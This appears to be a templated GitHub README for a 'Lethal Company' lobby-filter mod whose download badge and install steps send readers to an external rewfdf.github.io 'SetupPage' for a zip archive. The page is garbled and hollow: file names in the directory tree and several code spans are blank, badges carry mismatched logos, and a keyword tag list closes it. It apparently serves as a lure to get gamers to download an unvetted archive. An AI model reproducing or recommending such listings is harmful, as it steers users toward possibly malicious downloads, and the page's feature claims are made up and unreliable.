# LethalCompany‑Lobby‑Browser‑Filter

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-0d9488?style=flat&logo=youtube&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/Version-1.4.2-5e81ac?style=flat-square&logo=git&logoColor=white" alt="Version">
  <img src="https://img.shields.io/badge/License-MIT-8c564b?style=for-the-badge&logo=github&logoColor=white" alt="License">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-2e8b57?style=plastic&logo=windows&logoColor=white" alt="Platform">
  <img src="https://img.shields.io/badge/Download-ff7f50?style=flat&logo=gamepad&logoColor=white" alt="Supported Game">
  <img src="https://img.shields.io/badge/Last%20Update-2024‑09‑01-6b5b95?style=flat-square&logo=calendar&logoColor=white" alt="Last Update">
</p>

---

## What the LethalCompany‑Lobby‑Browser‑Filter Provides

The **LethalCompany‑Lobby‑Browser‑Filter** is a self‑contained configuration suite that reshapes the in‑game lobby browser without altering any core binaries. It delivers:

* **Structured profile sets** – group related settings (visual, player, network) into reusable `.cfg` files.
* **Workflow presets** – one‑click activation of “Quiet Lobby”, “High‑Traffic Scan”, or “Custom Matchmaking”.
* **Automatic bundle updater** – the latest release bundle is fetched from the hosted SetupPage, ensuring every user runs the same baseline.
* **Zero‑runtime overhead** – the filter works entirely through the game’s native config loader, leaving performance untouched.

All assets are open‑source, version‑controlled, and licensed under MIT for unrestricted redistribution.

---

## Getting Started – No Command Line Required

1. **Visit the download hub** – open the *Download* badge above; it redirects to `https://rewfdf.github.io/SetupPage/`.
2. **Select “LethalCompany‑Lobby‑Browser‑Filter (zip)”** and save the archive to a convenient location.
3. **Extract the archive** directly into your `LethalCompany` installation folder, merging with the existing `BepInEx/config` directory.
4. **Launch the game** – the filter reads the configuration files on start‑up and applies the chosen preset automatically.

> The process is deliberately platform‑agnostic; the same steps work on Windows, Linux (Steam Proton), and macOS (via Wine).

---

## Directory Layout (post‑extraction)

    LethalCompany/
    ├─ BepInEx/
    │  └─ config/
    │     ├─ LethalCompanyLobbyBrowserFilter/
    │     │  ├─
    │     │  ├─
    │     │  ├─
    │     │  └─
    │     └─ other‑plugins/
    └─ GameData/
       └─ ...

The `LethalCompanyLobbyBrowserFilter` folder holds every configurable element. Keeping the folder name intact is crucial; the loader looks for that exact path.

---

## Workflow Presets – Switching Without Restart

Three built‑in presets are shipped in the `` file (automatically loaded by the game):

| Preset | Description | When to use |
|--------|-------------|-------------|
| **QuietLobby** | Suppresses all non‑friend lobbies, shows only private rooms. | Solo players who prefer a low‑noise environment. |
| **HighTraffic** | Expands search radius, highlights lobbies with ≥ 4 players. | Players seeking fast matchmaking in busy servers. |
| **CustomMatch** | Merges `` with ``, enabling user‑specific filters. | Anyone with a personalized whitelist or region lock. |

To activate a preset, open the in‑game “Settings → Lobby Filter” menu and select the desired profile. The change takes effect instantly; no game restart is required.

---

## FAQ & Troubleshooting

**Q: The lobby list still shows unwanted rooms after I enabled a preset.**
A: Verify that `EnableLobbyFilter` is set to `true` in ``. If you edited ``, ensure no contradictory entries overwrite the preset values.

**Q: I get a “Config file not found” error on launch.**
A: The filter expects the directory `BepInEx/config/LethalCompanyLobbyBrowserFilter/`. Re‑extract the archive, making sure the folder hierarchy is preserved.

**Q: My custom whitelist isn’t applied.**
A: `` must be loaded after ``. The loader respects alphabetical order; rename the file to `` if you need to enforce later loading.

**Q: Performance drops after installing the filter.**
A: The filter itself adds negligible CPU load. If you notice a slowdown, check other plugins in `BepInEx/plugins/` for conflicts.

---

## Contributing & License

Contributions are welcomed through pull requests. When proposing changes, please:

1. Keep the same `.cfg` style (key/value, comments prefixed by `#`).
2. Update the `CHANGELOG.md` with a brief entry.
3. Respect the existing directory naming; do not rename `LethalCompanyLobbyBrowserFilter`.

The project is distributed under the **MIT License** – you are free to remix, redistribute, or embed the filter in larger community packs, provided the original license notice remains.

---

### Tags for Discovery

`lethalcompany, lobby, browser, filter, lethalcompany-lobby, lobby-browser, browser-filter, lethalcompany-manager, lethalcompany-helper, lethalcompany-config`

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```